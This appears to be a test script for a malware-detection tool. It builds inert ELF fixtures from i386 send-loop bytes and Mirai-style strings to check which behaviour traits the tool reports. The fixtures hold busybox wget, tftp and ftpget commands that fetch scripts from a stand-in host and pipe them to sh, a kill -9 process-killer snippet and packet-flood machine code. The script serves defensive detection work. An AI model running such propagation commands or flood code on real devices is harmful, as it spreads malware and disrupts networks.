#!/usr/bin/env python3
"""Inert controls for decoded process kills and bound i386 send loops."""
import argparse
import json
import os
from pathlib import Path
import runpy
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
HELPERS = runpy.run_path(str(ROOT / 'testdata/taxonomy/mirai-native-review/check.py'))
elf, escaped, reports = (HELPERS[k] for k in ('elf', 'escaped', 'reports'))
LOOP = 'micro-behaviors/communications/flood::x86-bound-strided-target-send-loop'
KILL = 'micro-behaviors/process/terminate/command::decoded-deleted-suffix-sigkill'
IMPACT = 'objectives/impact/degrade/process::router-propagation-deleted-image-killer'
FLOOD = 'objectives/impact/dos/flood::x86-router-worm-packet-flood'
# Relative call offsets link a repeated-send loop to sendto's six-argument
# socketcall stub and then the syscall itself. There is no executable entry.
loop = bytes.fromhex('668b45026689470250506a105768404000008b44241450568b44244050e80000000083c4208b4c24448b5424044183c718894c2444395424440f8412feffff')
send = bytes.fromhex('83ec348b4424388944241c8b44243c894424208b442440894424248b442444894424288b4424488944242c8b44244c894424308d44241c506a0be80000000083c43cc3')
syscall = bytes.fromhex('5383ec088b5424108b4c241487d3b866000000cd80')

def code(padding=32):
    data = bytearray(loop + bytes(padding) + send + bytes(padding) + syscall)
    send_at = len(loop) + padding
    syscall_at = send_at + len(send) + padding
    struct.pack_into('<i', data, 30, send_at - 34)
    struct.pack_into('<i', data, send_at + 59, syscall_at - send_at - 63)
    return data, send_at, syscall_at


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default='cleave')
    args = parser.parse_args()
    cases = []
    def case(name, rodata=b'', text=b'', yes=(), no=(), machine=3):
        cases.append((name, elf(rodata, text, machine), set(yes), set(no)))
    good, send_at, syscall_at = code()
    case('packet-generator.elf', text=good, yes=[LOOP], no=[FLOOD])
    moved, _, _ = code(99)
    case('relocated.elf', text=moved, yes=[LOOP], no=[FLOOD])
    for name, offset, replacement in [
        ('unbound-send', 30, struct.pack('<i', send_at - 33)),
        ('unbound-syscall', send_at + 59, struct.pack('<i', syscall_at - send_at - 62)),
        ('wrong-socket-operation', send_at + 57, b'\x0e'),
        ('no-syscall', syscall_at + 19, b'\x90\x90'),
        ('no-target-stride', 46, b'\x90\x90\x90'),
    ]:
        changed = good.copy()
        changed[offset:offset+len(replacement)] = replacement
        case(name + '.elf', text=changed, no=[LOOP, FLOOD])
    case('loop-in-data.elf', rodata=good, no=[LOOP, FLOOD])
    case('wrong-architecture.elf', text=good, machine=40, no=[LOOP, FLOOD])
    selection = '${image% (deleted)}\n'
    script = selection + ('# intermediate path exclusions\n' * 10) + 'kill -9 "$process"'
    case('maintenance.elf', escaped(script), yes=[KILL], no=[IMPACT])
    case('lowercase-escapes.elf', escaped(script, True), yes=[KILL], no=[IMPACT])
    case('no-sigkill.elf', escaped(script.replace('kill -9', 'echo')), no=[KILL, IMPACT])
    case('no-selection.elf', escaped('kill -9 "$process"'), no=[KILL, IMPACT])
    case('too-distant.elf', escaped(selection + '#' * 800 + 'kill -9 "$process"'), no=[KILL])
    case('unrelated-strings.elf', escaped(selection) + b'\0' + escaped('kill -9 "$process"'), no=[KILL])
    delivery = (b'enable\0system\0linuxshell\0ping ;sh\0chmod +x .p; ./.p\0'
                b'/bin/busybox wget http://192.0.2.1/wget.sh -O- | sh;'
                b'/bin/busybox tftp -g 192.0.2.1 -r tftp.sh -l- | sh;'
                b'/bin/busybox ftpget 192.0.2.1 ftpget.sh ftpget.sh && sh ftpget.sh\0'
                b'/proc/%d/exe\0/fd/\0/bin/busybox echo -ne \0')
    case('propagation-killer.elf', delivery + escaped(script), yes=[KILL, IMPACT])
    case('propagation-no-killer.elf', delivery, no=[KILL, IMPACT])
    case('propagation-flood.elf', delivery, good, yes=[LOOP, FLOOD])
    with tempfile.TemporaryDirectory(prefix='fallout-controls-') as tmp:
        targets = []
        for name, data, _, _ in cases:
            path = Path(tmp) / name
            path.write_bytes(data)
            targets.append(str(path))
        result = subprocess.run([
            args.cleave, '--no-update-check', '--traits-dir', str(ROOT),
            '--disable', 'radare2,upx', '--format', 'json', 'analyze', *targets,
        ], capture_output=True, text=True, check=True,
           env={**os.environ, 'CLEAVE_SKIP_CACHE': '1'})
        files = {Path(f['path']).name: f for f in reports(result.stdout)}
        for name, _, yes, no in cases:
            ids = {t['id'] for t in files[name].get('traits', [])}
            assert yes <= ids, (name, 'missing', yes - ids)
            assert not no & ids, (name, 'unexpected', no & ids)
            print('PASS', name)
    print(f'{len(cases)} controls passed')

if __name__ == '__main__':
    main()
